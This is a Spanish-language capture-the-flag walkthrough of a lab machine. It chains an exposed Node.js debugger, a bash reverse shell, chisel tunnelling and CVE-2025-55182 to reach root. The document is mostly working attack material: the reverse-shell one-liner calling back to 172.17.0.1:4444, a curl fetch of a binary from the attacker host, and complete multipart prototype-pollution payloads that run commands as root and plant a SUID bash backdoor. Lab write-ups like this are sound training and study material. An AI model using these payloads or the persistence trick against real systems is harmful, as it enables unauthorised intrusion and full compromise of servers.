
# 1. Reconocimiento

Comenzamos realizando un escaneo completo de puertos:

```bash
sudo nmap -sS -p- --min-rate 5000 172.17.0.2
```

Posteriormente realizamos enumeración de servicios sobre los puertos encontrados:

```bash
nmap -p8080,9229 -sVC 172.17.0.2
```

Encontramos:

| Puerto | Servicio | Descripción |
|---|---|---|
| `8080/tcp` | Node.js / Express | Aplicación web "Autoescuela Hackcar" |
| `9229/tcp` | Node.js Inspector | Interfaz de debugging de Node.js |

El puerto `9229` resulta especialmente interesante.

---
# 2. Node.js Inspector expuesto

## 2.1 ¿Qué es el puerto 9229?

Node.js incluye un inspector basado en el protocolo de debugging de Chrome DevTools.

Normalmente, cuando se utiliza para desarrollo, debería estar limitado a `localhost`, por ejemplo:

```text
127.0.0.1:9229
```

En esta máquina, sin embargo, el servicio está expuesto a la red.

Esto es extremadamente peligroso porque un atacante que pueda conectarse al Inspector puede interactuar con el proceso Node.js y ejecutar código JavaScript dentro de su contexto.

El nivel de privilegios dependerá del usuario que esté ejecutando el proceso.

---
## 2.2 Conexión al debugger

Podemos conectarnos directamente utilizando el cliente de debugging de Node.js:

```bash
node inspect 172.17.0.2:9229
```

Obtenemos:

```text
connecting to 172.17.0.2:9229 ... ok
debug>
```

Esto confirma que el Inspector está accesible remotamente.

---
# 3. RCE como `webuser`

Una vez conectados al debugger, podemos utilizar JavaScript para acceder a funcionalidades del proceso Node.js.

Utilizamos `child_process` para ejecutar comandos del sistema:

```javascript
exec('process.mainModule.require("child_process").execSync("id").toString()')
```

La respuesta es:

```text
'uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)\n'
```

Tenemos ejecución de comandos como:

```text
webuser
UID: 1001
GID: 1001
```

Por tanto, hemos conseguido nuestro primer **RCE**.

---
# 4. Reverse Shell

Para obtener una shell interactiva podemos ejecutar una reverse shell desde el proceso Node.js.

Primero generamos el payload en Base64:

```bash
echo -n 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1' | base64
```

Resultado:

```text
YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ==
```

El uso de Base64 facilita el transporte del payload y evita problemas con caracteres especiales dentro de la cadena JavaScript.

En la máquina atacante levantamos un listener:

```bash
nc -lvnp 4444
```

Desde el debugger ejecutamos:

```javascript
exec('process.mainModule.require("child_process").exec("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash")')
```

Recibimos una shell:

```text
webuser@autoescuela:~$
```

Comprobamos nuestra identidad:

```bash
id
```

```text
uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)
```

Podemos localizar el flag de usuario:

```bash
cat /home/webuser/user.txt
```

> **User Flag:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---
# 5. Enumeración local

Con acceso como `webuser`, comenzamos a enumerar el sistema.

Primero comprobamos los procesos:

```bash
ps aux
```

Entre los procesos encontramos:

```text
root   8   npm exec next dev -p 3000 -H 127.0.0.1
root  30   node /root/react_app/node_modules/.bin/next dev -p 3000 -H 127.0.0.1
root  42   next-server (v15.0.0-rc.1)
```

Esto resulta especialmente interesante por dos motivos:

1. Se está ejecutando **Next.js `15.0.0-rc.1`**.
2. El proceso pertenece a `root`.

---
## 5.1 Servicios escuchando localmente

Podemos comprobar los sockets abiertos:

```bash
ss -lntp
```

Encontramos:

```text
LISTEN 0 511 127.0.0.1:3000 0.0.0.0:*
```

El servicio está limitado a:

```text
127.0.0.1:3000
```

Por tanto, no podemos acceder directamente desde nuestra máquina atacante.

La situación es:

```text
Atacante
   │
   X
   │
   └──> 172.17.0.2:3000
             │
             └── Servicio no accesible externamente
```

Pero nosotros ya tenemos ejecución dentro del sistema.

Esto permite utilizar la máquina víctima como punto de **pivoting**.

---
# 6. Port Forwarding con Chisel

Para acceder al servicio interno desde nuestra máquina atacante utilizaremos **chisel**.

La idea es crear un túnel:

```text
Atacante
localhost:3000
      │
      │ Chisel
      ▼
Víctima
127.0.0.1:3000
      │
      ▼
Next.js
```

---
## 6.1 Preparar Chisel

Desde la máquina atacante descargamos Chisel:

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
```

Descomprimimos:

```bash
gunzip chisel_1.10.1_linux_amd64.gz
```

Renombramos el binario:

```bash
mv chisel_1.10.1_linux_amd64 chisel
chmod +x chisel
```

Para transferirlo a la máquina víctima podemos levantar un servidor HTTP temporal:

```bash
python3 -m http.server 8000
```

---
## 6.2 Descargar Chisel en la víctima

Desde la reverse shell:

```bash
curl http://172.17.0.1:8000/chisel -o /tmp/chisel
```

Damos permisos de ejecución:

```bash
chmod +x /tmp/chisel
```

---
## 6.3 Servidor Chisel

En la máquina atacante levantamos el servidor:

```bash
./chisel server -p 9000 --reverse
```

---
## 6.4 Cliente Chisel

Desde la máquina víctima:

```bash
/tmp/chisel client 172.17.0.1:9000 R:3000:127.0.0.1:3000
```

La opción:

```text
R:3000:127.0.0.1:3000
```

crea un **reverse port forward**.

El resultado es que:

```text
Atacante:3000
      │
      ▼
Chisel Server
      │
      ▼
Chisel Client
      │
      ▼
Víctima:127.0.0.1:3000
```

Ahora podemos acceder desde nuestra máquina atacante:

```bash
curl http://127.0.0.1:3000
```

---
# 7. Identificación del servicio interno

La respuesta del servicio es:

```text
Internal Administration Portal
Version: 15.0.0-rc.1
Environment: Restricted (Internal Only)
```

Tenemos una versión concreta de Next.js:

```text
Next.js 15.0.0-rc.1
```

Además, anteriormente comprobamos que el proceso se ejecuta como:

```text
root
```

Esto convierte el servicio en un objetivo especialmente interesante.

---
# 8. CVE-2025-55182

La versión desplegada es vulnerable a **CVE-2025-55182**, una vulnerabilidad relacionada con el procesamiento de datos de React Server Components / Server Actions.

La vulnerabilidad permite construir una petición especialmente manipulada que afecta al proceso de deserialización y puede conducir a **ejecución remota de código**.

En este laboratorio, el impacto es especialmente grave porque el proceso vulnerable está ejecutándose como:

```text
root
```

Por tanto:

```text
CVE-2025-55182
        ↓
RCE
        ↓
UID 0
        ↓
root
```

---
# 9. Explotación — RCE como root

El endpoint vulnerable puede ser alcanzado mediante una petición `POST` especialmente construida.

La petición utilizada en el laboratorio es:

```bash
curl -X POST http://localhost:3000/ \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -H "Next-Action: test" \
  -H "Accept: text/x-component" \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
```

La respuesta contiene:

```text
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)"}
```

Esto confirma que hemos conseguido ejecutar comandos con:

```text
uid=0(root)
gid=0(root)
```

Por tanto, **la escalada de privilegios ya se ha producido en este punto**.

> **Importante:** el `chmod u+s /bin/bash` realizado posteriormente no es necesario para conseguir `root`; se utiliza para convertir el acceso privilegiado obtenido mediante el RCE en un mecanismo local de reentrada mediante una shell SUID.

---
# 10. Crear una Bash SUID

Ya disponemos de ejecución como `root`, por lo que podemos modificar los permisos de `/bin/bash`.

Ejecutamos mediante el mismo mecanismo de RCE:

```bash
chmod u+s /bin/bash
```

La petición es:

```bash
curl -X POST http://localhost:3000/ \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -H "Next-Action: test" \
  -H "Accept: text/x-component" \
  --data-binary $'------Boundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"process.mainModule.require(\\'child_process\\').execSync(\\'chmod u+s /bin/bash\\').toString()","_formData":{"get":"$1:constructor:constructor"}}}\r\n------Boundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------Boundary--\r\n'
```

---
# 11. Verificación del SUID

Comprobamos los permisos de Bash:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x 1 root root 1446024 Mar 31 2024 /bin/bash
```

La parte:

```text
rws
```

indica que el bit **SUID** está establecido.

Normalmente encontraríamos:

```text
rwx
```

pero ahora tenemos:

```text
rws
```

La `s` indica que el ejecutable puede ejecutarse con el **UID efectivo del propietario**, en este caso:

```text
root
```

---
# 12. Obtención de Root Shell

Desde la shell de `webuser` ejecutamos:

```bash
bash -p
```

El parámetro `-p` indica a Bash que preserve los privilegios efectivos en lugar de realizar el descenso de privilegios que puede ocurrir cuando existe una diferencia entre el UID real y el UID efectivo.

Comprobamos:

```bash
id
```

Resultado:

```text
uid=1001(webuser) gid=1001(webuser) euid=0(root) groups=1001(webuser)
```

Aunque el UID real sigue siendo:

```text
1001(webuser)
```

el UID efectivo es:

```text
0(root)
```

Comprobamos el usuario efectivo:

```bash
whoami
```

```text
root
```

Ya tenemos una shell privilegiada.

Finalmente:

```bash
cat /root/root.txt
```

> **Root Flag:** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

---
# 13. Cadena de ataque completa

```text
┌──────────────────────────────────────────────┐
│                RECONOCIMIENTO                │
└──────────────────────┬───────────────────────┘
                       │
                       ▼
              TCP/9229 expuesto
                       │
                       ▼
             Node.js Inspector
                       │
                       ▼
              JavaScript RCE
                       │
                       ▼
               webuser shell
                       │
                       ▼
              User Flag obtenido
                       │
                       ▼
             Enumeración local
                       │
                       ▼
        Next.js 15.0.0-rc.1 como root
              127.0.0.1:3000
                       │
                       ▼
                Chisel Tunnel
                       │
                       ▼
          Servicio interno accesible
                       │
                       ▼
              CVE-2025-55182
                       │
                       ▼
                 RCE como root
                       │
                       ▼
               UID 0 obtenido
                       │
                       ▼
             chmod u+s /bin/bash
                       │
                       ▼
                   bash -p
                       │
                       ▼
                 Root Shell
                       │
                       ▼
               Root Flag obtenido
```

---